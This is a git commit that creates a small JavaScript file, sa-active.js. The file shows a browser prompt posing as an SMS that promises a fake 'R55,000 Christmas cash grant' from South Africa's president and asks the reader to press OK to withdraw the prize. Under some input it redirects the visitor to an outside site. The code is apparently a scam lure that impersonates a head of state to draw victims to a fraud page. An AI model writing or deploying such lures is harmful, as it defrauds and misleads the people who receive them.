c6421e6dd510b685690106d39bba2a83002ec953
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-21 08:02:56 -0800

    Create sa-active.js

---
+++ sa-active.js
@@ -0,0 +1,6 @@
+
+var password = 'R55,000 X-MAS GRANT'
+password=prompt('SMS: Congratulations You are qualify for President CYRIL RAMAPHOSA R55,000 CHRISTMAS CASH GRANT FOR SOUTH AFRICANS, Kindly Press OK to Withdraw Cash Prize   ','R55,000 X-MAS GRANT');
+if (password != 'R55,000 X-MAS GRANT') {
+location.href='https://xmas-gift.org/sa-grant.html';
+}
